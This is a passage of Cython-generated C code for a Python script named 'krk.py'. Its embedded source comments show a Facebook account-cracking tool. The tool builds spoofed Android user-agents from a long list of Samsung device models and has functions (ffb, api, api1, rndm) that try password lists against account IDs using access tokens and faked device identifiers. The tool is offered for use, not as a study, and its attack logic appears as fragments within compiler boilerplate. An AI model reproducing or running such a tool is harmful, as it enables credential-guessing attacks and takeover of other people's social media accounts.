'GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
 * samsung = ['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G', 'SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'SM-J320M|LMY47V', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'GT-I9192|KOT49H', 'SM-G935F|MMB29K', 'SM-J701F|NRD90M;', 'GT-I9301I|KOT4', 'SM-J320FN|LMY47V', 'SM-T111|JDQ39', 'SM-A500F|MMB29M', 'SM-J510FN|NMF2', 'SM-T705|LRX22G', 'SM-G920F|NRD90M', 'GT-N5100|JZO54K', 'GT-I9300I|KTU84P', 'GT-I9300I|KTU84P', 'GT-N8000|KOT49H', 'GT-N8000|KOT49H', 'SM-A500F|MMB29M', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5100|JDQ39', 'GT-I9300I|KTU84P', 'GT-N5100|JZO54K', 'GT-N8000|KOT49H', 'GT-I9500|LRX22C', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'GT-N8000|JZO54K', 'SM-T805|LRX22G', 'SM-T231|KOT49H', 'GT-N5100|JZO54K', 'SM-J320H|LMY47V', 'SM-T231|KOT49H', 'SM-G930F|NRD90M', 'SM-G935F|NRD90M', 'SM-T310|KOT49H', 'GT-N8000|KOT49H', 'GT-I9300I|KTU84P', 'SM-G920F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T705|LRX22G;', 'GT-P3110|JZO54K', 'GT-I9192|KOT49H', 'SM-J320F|LMY47V', 'SM-G920F|NRD90M', 'GT-I9300|IMM76D', 'SM-G950F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X;', 'SM-J701F|NRD90M', 'SM-A500F|LRX22G', 'SM-T231|KOT49H', 'SM-T311|KOT49H', 'SM-J320FN|LMY47V', 'GT-P5210|KOT49H', 'SM-T805|LRX22G', 'GT-I9500|LRX22C', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'GT-I9300|JSS15J', 'GT-N7100|KOT49H', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'SM-T315|JDQ39', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-P5220|JDQ39', 'SM-T525|KOT49H', 'SM-T555|LRX22G', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X;', 'SM-A500F|MMB29M', 'GT-I9192|KOT49H', 'GT-P5100|JDQ', 'SM-T311|KOT49H']
 */
  __pyx_tuple__87 = PyTuple_Pack(5, __pyx_kp_s_com_facebook_adsmanager, __pyx_kp_s_com_facebook_lite, __pyx_kp_s_com_facebook_orca, __pyx_kp_s_com_facebook_katana, __pyx_kp_s_com_facebook_mlite); if (unlikely(!__pyx_tuple__87)) __PYX_ERR(0, 16, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__87);
  __Pyx_GIVEREF(__pyx_tuple__87);

  /* "krk.py":25
 *         c=f' TL-tl; {str(gt)}'
 *         g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
 *         h=random.randrange(73,100)             # <<<<<<<<<<<<<<
 *         i='0'
 *         j=random.randrange(4200,4900)
 */
  __pyx_tuple__88 = PyTuple_Pack(2, __pyx_int_73, __pyx_int_100); if (unlikely(!__pyx_tuple__88)) __PYX_ERR(0, 25, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__88);
  __Pyx_GIVEREF(__pyx_tuple__88);

  /* "krk.py":27
 *         h=random.randrange(73,100)
 *         i='0'
 *         j=random.randrange(4200,4900)             # <<<<<<<<<<<<<<
 *         k=random.randrange(40,150)
 *         l='Mobile Safari/537.36'
 */
  __pyx_tuple__89 = PyTuple_Pack(2, __pyx_int_4200, __pyx_int_4900); if (unlikely(!__pyx_tuple__89)) __PYX_ERR(0, 27, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__89);
  __Pyx_GIVEREF(__pyx_tuple__89);

  /* "krk.py":28
 *         i='0'
 *         j=random.randrange(4200,4900)
 *         k=random.randrange(40,150)             # <<<<<<<<<<<<<<
 *         l='Mobile Safari/537.36'
 *         uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
 */
  __pyx_tuple__90 = PyTuple_Pack(2, __pyx_int_40, __pyx_int_150); if (unlikely(!__pyx_tuple__90)) __PYX_ERR(0, 28, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__90);
  __Pyx_GIVEREF(__pyx_tuple__90);

  /* "krk.py":37
 *         c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
 *         d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
 *         e=random.randrange(1, 999)             # <<<<<<<<<<<<<<
 *         f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
 *         g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
 */
  __pyx_tuple__93 = PyTuple_Pack(2, __pyx_int_1, __pyx_int_999); if (unlikely(!__pyx_tuple__93)) __PYX_ERR(0, 37, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__93);
  __Pyx_GIVEREF(__pyx_tuple__93);

  /* "krk.py":63
 * |   Versino      :     1.6
 * +==================================================+""")
 * def linex():             # <<<<<<<<<<<<<<
 *         print('\033[1;37m----------------------------------------------')
 * def clear():
 */
  __pyx_codeobj__94 = (PyObject*)__Pyx_PyCode_New(0, 0, 0, 0, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_krk_py, __pyx_n_s_linex, 63, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__94)) __PYX_ERR(0, 63, __pyx_L1_error)

  /* "krk.py":65
 * def linex():
 *         print('\033[1;37m----------------------------------------------')
 * def clear():             # <<<<<<<<<<<<<<
 *         os.system('clear')
 *         print(logo)
 */
  __pyx_codeobj__95 = (PyObject*)__Pyx_PyCode_New(0, 0, 0, 0, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_krk_py, __pyx_n_s_clear, 65, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__95)) __PYX_ERR(0, 65, __pyx_L1_error)

  /* "krk.py":76
 * tokenku=[]
 * 
 * def menu():             # <<<<<<<<<<<<<<
 *         try:
 *                 clear()
 */
  __pyx_tuple__96 = PyTuple_Pack(21, __pyx_n_s_x, __pyx_n_s_xd, __pyx_n_s_file, __pyx_n_s_fo, __pyx_n_s_mthd, __pyx_n_s_plist, __pyx_n_s_ppp, __pyx_n_s_ps_limit, __pyx_n_s_i, __pyx_n_s_cx, __pyx_n_s_crack_submit, __pyx_n_s_total_ids, __pyx_n_s_user, __pyx_n_s_ids, __pyx_n_s_names, __pyx_n_s_passlist, __pyx_n_s_dump, __pyx_n_s_wx, __pyx_n_s_url_wa, __pyx_n_s_name, __pyx_n_s_tks); if (unlikely(!__pyx_tuple__96)) __PYX_ERR(0, 76, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__96);
  __Pyx_GIVEREF(__pyx_tuple__96);
  __pyx_codeobj__97 = (PyObject*)__Pyx_PyCode_New(0, 0, 0, 21, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__96, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_krk_py, __pyx_n_s_menu, 76, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__97)) __PYX_ERR(0, 76, __pyx_L1_error)

  /* "krk.py":229
 *                 print('\n No internet connection ...')
 *                 exit()
 * def pak():             # <<<<<<<<<<<<<<
 *                 user=[]
 *                 clear()
 */
  __pyx_tuple__98 = PyTuple_Pack(12, __pyx_n_s_user, __pyx_n_s_code, __pyx_n_s_limit, __pyx_n_s_nmbr, __pyx_n_s_nmp, __pyx_n_s_Sabir, __pyx_n_s_tl, __pyx_n_s_psx, __pyx_n_s_ids, __pyx_n_s_passlist, __pyx_n_s_genexpr, __pyx_n_s_genexpr); if (unlikely(!__pyx_tuple__98)) __PYX_ERR(0, 229, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__98);
  __Pyx_GIVEREF(__pyx_tuple__98);
  __pyx_codeobj__99 = (PyObject*)__Pyx_PyCode_New(0, 0, 0, 12, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__98, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_krk_py, __pyx_n_s_pak, 229, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__99)) __PYX_ERR(0, 229, __pyx_L1_error)

  /* "krk.py":259
 *                 input(' Press enter to back ')
 *                 os.system('python ZEA.py')
 * def bd():             # <<<<<<<<<<<<<<
 *                 user=[]
 *                 clear()
 */
  __pyx_codeobj__100 = (PyObject*)__Pyx_PyCode_New(0, 0, 0, 12, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__98, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_krk_py, __pyx_n_s_bd, 259, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__100)) __PYX_ERR(0, 259, __pyx_L1_error)

  /* "krk.py":289
 *                 input(' Press enter to back ')
 *                 os.system('python ZEA.py')
 * def gmail():             # <<<<<<<<<<<<<<
 *                 os.system('rm -rf .re.txt')
 *                 clear()
 */
  __pyx_tuple__101 = PyTuple_Pack(22, __pyx_n_s_first, __pyx_n_s_last, __pyx_n_s_domain_2, __pyx_n_s_limit, __pyx_n_s_lists, __pyx_n_s_xd, __pyx_n_s_lchoice, __pyx_n_s_mail, __pyx_n_s_fo, __pyx_n_s_Sabir, __pyx_n_s_total, __pyx_n_s_user, __pyx_n_s_ids, __pyx_n_s_names, __pyx_n_s_first_name, __pyx_n_s_last_name, __pyx_n_s_fs, __pyx_n_s_ls, __pyx_n_s_passlist, __pyx_n_s_genexpr, __pyx_n_s_genexpr, __pyx_n_s_genexpr); if (unlikely(!__pyx_tuple__101)) __PYX_ERR(0, 289, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__101);
  __Pyx_GIVEREF(__pyx_tuple__101);
  __pyx_codeobj__102 = (PyObject*)__Pyx_PyCode_New(0, 0, 0, 22, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__101, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_krk_py, __pyx_n_s_gmail, 289, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__102)) __PYX_ERR(0, 289, __pyx_L1_error)

  /* "krk.py":344
 *                 input(' Press enter to back ')
 *                 os.system('python ZEA')
 * def ffb(ids,names,passlist):             # <<<<<<<<<<<<<<
 *         global loop,oks,cps
 *         sys.stdout.write('\r\r\033[1;37m [ZEA-XD-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 */
  __pyx_tuple__103 = PyTuple_Pack(16, __pyx_n_s_ids, __pyx_n_s_names, __pyx_n_s_passlist, __pyx_n_s_session, __pyx_n_s_first, __pyx_n_s_last, __pyx_n_s_ps, __pyx_n_s_ps2, __pyx_n_s_fikr, __pyx_n_s_pas, __pyx_n_s_ua, __pyx_n_s_head, __pyx_n_s_getlog, __pyx_n_s_idpass, __pyx_n_s_complete, __pyx_n_s_Sabir); if (unlikely(!__pyx_tuple__103)) __PYX_ERR(0, 344, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__103);
  __Pyx_GIVEREF(__pyx_tuple__103);
  __pyx_codeobj__104 = (PyObject*)__Pyx_PyCode_New(3, 0, 0, 16, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__103, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_krk_py, __pyx_n_s_ffb, 344, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__104)) __PYX_ERR(0, 344, __pyx_L1_error)

  /* "krk.py":382
 *                 time.sleep(20)
 *         loop+=1
 * def api(ids,names,passlist):             # <<<<<<<<<<<<<<
 *         try:
 *                 global ok,loop,sim_id
 */
  __pyx_tuple__105 = PyTuple_Pack(45, __pyx_n_s_ids, __pyx_n_s_names, __pyx_n_s_passlist, __pyx_n_s_fn, __pyx_n_s_ln, __pyx_n_s_pw, __pyx_n_s_pas, __pyx_n_s_accessToken, __pyx_n_s_fbav, __pyx_n_s_fbbv, __pyx_n_s_android_version, __pyx_n_s_model, __pyx_n_s_build, __pyx_n_s_fblc, __pyx_n_s_fbcr, __pyx_n_s_fbmf, __pyx_n_s_fbbd, __pyx_n_s_fbdv, __pyx_n_s_fbsv, __pyx_n_s_fbca, __pyx_n_s_fbdm, __pyx_n_s_fbfw, __pyx_n_s_fbrv, __pyx_n_s_fban, __pyx_n_s_fbpn, __pyx_n_s_ua, __pyx_n_s_random_seed, __pyx_n_s_adid, __pyx_n_s_device_id, __pyx_n_s_secure, __pyx_n_s_family, __pyx_n_s_xd, __pyx_n_s_sim_serials, __pyx_n_s_li, __pyx_n_s_li2, __pyx_n_s_j1, __pyx_n_s_jazoest, __pyx_n_s_data, __pyx_n_s_headers, __pyx_n_s_url, __pyx_n_s_twf, __pyx_n_s_po, __pyx_n_s_e, __pyx_n_s_genexpr, __pyx_n_s_genexpr); if (unlikely(!__pyx_tuple__105)) __PYX_ERR(0, 382, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__105);
  __Pyx_GIVEREF(__pyx_tuple__105);
  __pyx_codeobj__106 = (PyObject*)__Pyx_PyCode_New(3, 0, 0, 45, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__105, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_krk_py, __pyx_n_s_api, 382, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__106)) __PYX_ERR(0, 382, __pyx_L1_error)

  /* "krk.py":488
 *         except Exception as e:
 *                 pass
 * def api1(ids,names,passlist):             # <<<<<<<<<<<<<<
 *         try:
 *                 global ok,loop,sim_id
 */
  __pyx_codeobj__107 = (PyObject*)__Pyx_PyCode_New(3, 0, 0, 45, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__105, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_krk_py, __pyx_n_s_api1, 488, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__107)) __PYX_ERR(0, 488, __pyx_L1_error)

  /* "krk.py":584
 *         except Exception as e:
 *                 pass
 * def rndm(ids,passlist):             # <<<<<<<<<<<<<<
 *         global loop
 *         global oks
 */
  __pyx_tuple__108 = PyTuple_Pack(42, __pyx_n_s_ids, __pyx_n_s_passlist, __pyx_n_s_pas, __pyx_n_s_accessToken, __pyx_n_s_fbav, __pyx_n_s_fbbv, __pyx_n_s_android_version, __pyx_n_s_model, __pyx_n_s_build, __pyx_n_s_fblc, __pyx_n_s_fbcr, __pyx_n_s_fbmf, __pyx_n_s_fbbd, __pyx_n_s_fbdv, __pyx_n_s_fbsv, __pyx_n_s_fbca, __pyx_n_s_fbdm, __pyx_n_s_fbfw, __pyx_n_s_fbrv, __pyx_n_s_fban, __pyx_n_s_fbpn, __pyx_n_s_ua, __pyx_n_s_random_seed, __pyx_n_s_adid, __pyx_n_s_device_id, __pyx_n_s_secure, __pyx_n_s_family, __pyx_n_s_xd, __pyx_n_s_sim_serials, __pyx_n_s_li, __pyx_n_s_li2, __pyx_n_s_j1, __pyx_n_s_jazoest, __pyx_n_s_data, __pyx_n_s_headers, __pyx_n_s_url, __pyx_n_s_twf, __pyx_n_s_po, __pyx_n_s_uid, __pyx_n_s_e, __pyx_n_s_genexpr, __pyx_n_s_genexpr); if (unlikely(!__pyx_tuple__108)) __PYX_ERR(0, 584, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__108);
  __Pyx_GIVEREF(__pyx_tuple__108);
  __pyx_codeobj__109 = (PyObject*)__Pyx_PyCode_New(2, 0, 0, 42, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__108, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_krk_py, __pyx_n_s_rndm, 584, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__109)) __PYX_ERR(0, 584, __pyx_L1_error)
  __Pyx_RefNannyFinishContext();
  return 0;
  __pyx_L1_error:;
  __Pyx_RefNannyFinishContext();
  return -1;
}
/* #### Code section: init_constants ### */

static CYTHON_SMALL_CODE int __Pyx_InitConstants(void) {
  if (__Pyx_CreateStringTabAndInitStrings() < 0) __PYX_ERR(0, 1, __pyx_L1_error);
  __pyx_float_2e7 = PyFloat_FromDouble(2e7); if (unlikely(!__pyx_float_2e7)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_float_3e7 = PyFloat_FromDouble(3e7); if (unlikely(!__pyx_float_3e7)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_0 = PyInt_FromLong(0); if (unlikely(!__pyx_int_0)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_1 = PyInt_FromLong(1); if (unlikely(!__pyx_int_1)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_2 = PyInt_FromLong(2); if (unlikely(!__pyx_int_2)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_11 = PyInt_FromLong(11); if (unlikely(!__pyx_int_11)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_16 = PyInt_FromLong(16); if (unlikely(!__pyx_int_16)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_20 = PyInt_FromLong(20); if (unlikely(!__pyx_int_20)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_30 = PyInt_FromLong(30); if (unlikely(!__pyx_int_30)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_40 = PyInt_FromLong(40); if (unlikely(!__pyx_int_40)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_73 = PyInt_FromLong(73); if (unlikely(!__pyx_int_73)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_99 = PyInt_FromLong(99); if (unlikely(!__pyx_int_99)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_100 = PyInt_FromLong(100); if (unlikely(!__pyx_int_100)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_111 = PyInt_FromLong(111); if (unlikely(!__pyx_int_111)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_150 = PyInt_FromLong(150); if (unlikely(!__pyx_int_150)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_999 = PyInt_FromLong(999); if (unlikely(!__pyx_int_999)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_4200 = PyInt_FromLong(4200); if (unlikely(!__pyx_int_4200)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_4900 = PyInt_FromLong(4900); if (unlikely(!__pyx_int_4900)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_5000 = PyInt_FromLong(5000); if (unlikely(!__pyx_int_5000)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_11111 = PyInt_FromLong(11111L); if (unlikely(!__pyx_int_11111)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_99999 = PyInt_FromLong(99999L); if (unlikely(!__pyx_int_99999)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_111111111 = PyInt_FromLong(111111111L); if (unlikely(!__pyx_int_111111111)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_999999999 = PyInt_FromLong(999999999L); if (unlikely(!__pyx_int_999999999)) __PYX_ERR(0, 1, __pyx_L1_error)
  return 0;
  __pyx_L1_error:;
  return -1;
}
/* #### Code section: init_globals ### */

static CYTHON_SMALL_CODE int __Pyx_InitGlobals(void) {
  return 0;
}
/* #### Code section: init_module ### */

static CYTHON_SMALL_CODE int __Pyx_modinit_global_init_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_variable_export_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_function_export_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_type_init_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_type_import_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_variable_import_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_function_import_code(void); /*proto*/

static int __Pyx_modinit_global_init_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_global_init_code", 0);
  /*--- Global init code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_variable_export_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_variable_export_code", 0);
  /*--- Variable export code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_function_export_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_function_export_code", 0);
  /*--- Function export code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_type_init_code(void) {
  __Pyx_RefNannyDeclarations
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("__Pyx_modinit_type_init_code", 0);
  /*--- Type init code ---*/
  #if CYTHON_USE_TYPE_SPECS
  __pyx_ptype_3krk___pyx_scope_struct__genexpr = (PyTypeObject *) __Pyx_PyType_FromModuleAndSpec(__pyx_m, &__pyx_type_3krk___pyx_scope_struct__genexpr_spec, NULL); if (unlikely(!__pyx_ptype_3krk___pyx_scope_struct__genexpr)) __PYX_ERR(0, 239, __pyx_L1_error)
  if (__Pyx_fix_up_extension_type_from_spec(&__pyx_type_3krk___pyx_scope_struct__genexpr_spec, __pyx_ptype_3krk___pyx_scope_struct__genexpr) < 0) __PYX_ERR(0, 239, __pyx_L1_error)
  #else
  __pyx_ptype_3krk___pyx_scope_struct__genexpr = &__pyx_type_3krk___pyx_scope_struct__genexpr;
  #endif
  #if !CYTHON_COMPILING_IN_LIMITED_API
  #endif
  #if !CYTHON_USE_TYPE_SPECS
  if (__Pyx_PyType_Ready(__pyx_ptype_3krk___pyx_scope_struct__genexpr) < 0) __PYX_ERR(0, 239, __pyx_L1_error)
  #endif
  #if PY_MAJOR_VERSION < 3
  __pyx_ptype_3krk___pyx_scope_struct__genexpr->tp_print = 0;
  #endif
  #if !CYTHON_COMPILING_IN_LIMITED_API
  if ((CYTHON_USE_TYPE_SLOTS && CYTHON_USE_PYTYPE_LOOKUP) && likely(!__pyx_ptype_3krk___pyx_scope_struct__genexpr->tp_dictoffset && __pyx_ptype_3krk___pyx_scope_struct__genexpr->tp_getattro == PyObject_GenericGetAttr)) {
    __pyx_ptype_3krk___pyx_scope_struct__genexpr->tp_getattro = __Pyx_PyObject_GenericGetAttrNoDict;
  }
  #endif
  #if CYTHON_USE_TYPE_SPECS
  __pyx_ptype_3krk___pyx_scope_struct_1_genexpr = (PyTypeObject *) __Pyx_PyType_FromModuleAndSpec(__pyx_m, &__pyx_type_3krk___pyx_scope_struct_1_genexpr_spec, NULL); if (unlikely(!__pyx_ptype_3krk___pyx_scope_struct_1_genexpr)) __PYX_ERR(0, 269, __pyx_L1_error)
  if (__Pyx_fix_up_extension_type_from_spec(&__pyx_type_3krk___pyx_scope_struct_1_genexpr_spec, __pyx_ptype_3krk___pyx_scope_struct_1_genexpr) < 0) __PYX_ERR(0, 269, __pyx_L1_error)
  #else
  __pyx_ptype_3krk___pyx_scope_struct_1_genexpr = &__pyx_type_3krk___pyx_scope_struct_1_genexpr;
  #endif
  #if !CYTHON_COMPILING_IN_LIMITED_API
  #endif
  #if !CYTHON_USE_TYPE_SPECS
  if (__Pyx_PyType_Ready(__pyx_ptype_3krk___pyx_scope_struct_1_genexpr) < 0) __PYX_ERR(0, 269, __pyx_L1_error)
  #endif
  #if PY_MAJOR_VERSION < 3
  __pyx_ptype_3krk___pyx_scope_struct_1_genexpr->tp_print = 0;
  #endif
  #if !CYTHON_COMPILING_IN_LIMITED_API
  if ((CYTHON_USE_TYPE_SLOTS && CYTHON_USE_PYTYPE_LOOKUP) && likely(!__pyx_ptype_3krk___pyx_scope_struct_1_genexpr->tp_dictoffset && __pyx_ptype_3krk___pyx_scope_struct_1_genexpr->tp_getattro == PyObject_GenericGetAttr)) {
    __pyx_ptype_3krk___pyx_scope_struct_1_genexpr->tp_getattro = __Pyx_PyObject_GenericGetAttrNoDict;
  }
  #endif
  #if CYTHON_USE_TYPE_SPECS
  __pyx_ptype_3krk___pyx_scope_struct_2_genexpr = (PyTypeObject *) __Pyx_PyType_FromModuleAndSpec(__pyx_m, &__pyx_type_3krk___pyx_scope_struct_2_genexpr_spec, NULL); if (unlikely(!__pyx_ptype_3krk___pyx_scope_struct_2_genexpr)) __PYX_ERR(0, 314, __pyx_L1_error)
  if (__Pyx_fix_up_extension_type_from_spec(&__pyx_type_3krk___pyx_scope_struct_2_genexpr_spec, __pyx_ptype_3krk___pyx_scope_struct_2_genexpr) < 0) __PYX_ERR(0, 314, __pyx_L1_error)
  #else
